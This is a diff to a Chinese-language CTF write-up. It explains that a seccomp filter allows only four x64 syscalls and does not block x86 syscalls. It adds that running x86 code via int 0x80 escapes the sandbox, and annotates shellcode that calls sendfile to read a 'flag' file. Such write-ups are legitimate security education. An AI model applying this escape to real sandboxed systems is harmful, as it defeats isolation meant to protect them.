@@ -292,7 +292,8 @@ point_path:
     assert(seccomp_load(ctx) == 0);
 ```
 这段代码，只允许4个系统调用`close,stat,lstat,fstat`在x64中，系统调用号为：`3,4,5,6`<br>
-然而**并没有x86架构的限制**<br>
+然而**并没有x86架构的系统调用限制**<br>
+因此，只要执行正常的x86架构即可逃逸<br>
 ```asm
 .global _start
 _start:
@@ -307,7 +308,7 @@ mov ebx, 1
 mov ecx, eax
 mov edx, 0
 mov esi,128
-mov eax, 187
+mov eax, 187 # sendfile
 int 0x80
 file_path:
 .string "flag"
